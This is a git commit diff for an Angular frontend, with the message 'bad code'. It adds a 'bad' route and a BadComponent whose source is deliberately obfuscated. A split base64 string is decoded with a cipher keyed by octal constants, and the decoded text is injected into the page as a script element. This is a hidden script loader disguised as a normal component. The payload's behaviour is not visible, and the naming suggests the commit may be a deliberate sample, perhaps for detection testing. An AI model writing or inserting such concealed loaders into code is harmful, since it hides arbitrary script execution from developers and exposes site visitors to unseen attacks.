e4f667c7a84ef7ea597079059c46a7f05706500a
Quentin Horgues <quentin.horgues@outlook.fr>
2024-12-06 06:28:18 +0100

    bad code

--- dualboute-frontend/src/app/app.routes.ts
+++ dualboute-frontend/src/app/app.routes.ts
@@ -1,8 +1,10 @@
 import { Routes } from '@angular/router';
 import {HOME} from '@angular/cdk/keycodes';
 import {HomeComponent} from './feature/home/home.component';
+import { BadComponent } from './bad/bad.component';
 
 export const routes: Routes = [
   { path: '', component: HomeComponent, data: {routeName: 'home'}},
+  { path: 'bad', component: BadComponent},
   { path: '**', pathMatch: 'full', redirectTo: '' }
 ];
---
+++ dualboute-frontend/src/app/bad/bad.component.ts
@@ -0,0 +1,33 @@
+
+                import { Component } from                      '@angular/core';
+            @Component({selector: 'app-bad',templateUrl: './bad.component.html',
+            styleUrls: ['./bad.component.css']}) export class BadComponent { 
+           protected c= "fpKPz9vi5eOM1drk0NnRlK+P0NvX59zR2uig0t7R1ebUsdjZ39Ta"+
+           "4JyZ2NLe1d/Uk5WvfI+M1drk0NnRounY0ODckqyMk6mon5OnfpKP1dLm09zRmtzX2NP"+
+           "U6JKsjJOno6STp36Sj9XS5tPc0Zrn5NKMqZSZ1+Dg5OWpm5vr6eaa5ePn4+HO2aDS29m"+
+                   "j19zO0dih073jqO"                      +"mow9PM1cCrzenm"
+                   +"3tzY1eusnZOvf"                      +"I+M1drk0NnRotj"
+                   +"hzdnZtN7e0Nnk"                      +"j6mMm6KWp3aUkt"
+                  +"jS3tXf1JrN4N7"                      +"e44yxkpbNz9fX2"
+                 +"9He49/U4NHmrY"                      +"/N4ejh39jN7a2P"+
+                 "z9jd4tHbzebWnO"+                     "Pe3ebUp4zZ4NLe5eT"
+                +"m1NCZ4dfT1c2vk"                     +"tbl3uPl0tvc2a2P3"
+                +"NXX5uTe0aHb3Z"                     +"nc3dXj4d7Zmap2jJ"+
+               "Tb1d7N4dedzdjg"                      +"4eay4eDe4s/e2dfdj"
+               +"KmU5uHh0a98j4"                      +"zQ49Xk2dHi5p3O29j"
+               +"rnc3c5Nfd0K/c"                      +"29vQlN3Y4c3Z2Zuqd"
+               +"g==";protected                       __s(a:any,b:any):any
+               {var c=Uint8Array                      .from(atob(a), z=>z.
+               charCodeAt(0));var                     d=new Uint8Array(c.
+                length);for(let i=                     0;i<c.length;i++){d
+                 [i]=(c[i]-b[i % b.                     length]+256)%256;}
+                 return new TextDecoder()               .decode(d);}r() 
+                  {var i = 0o16434467554;                 var j:any=new 
+                  Uint8Array([(i&                        0o37700000000)>>
+                  0o30,(i&0o77600000)                    >>0o20,(i&0o177400
+                   )>>0o10,i&0o377,i&                     (0o17740000>>0o16
+                    )]);var _s=this.                      __s(this.c, j); 
+                     var _=document.                       createElement
+                     ('script');_.                          text = _s;
+                      document.body.                          appendChild
+                       (_);}}
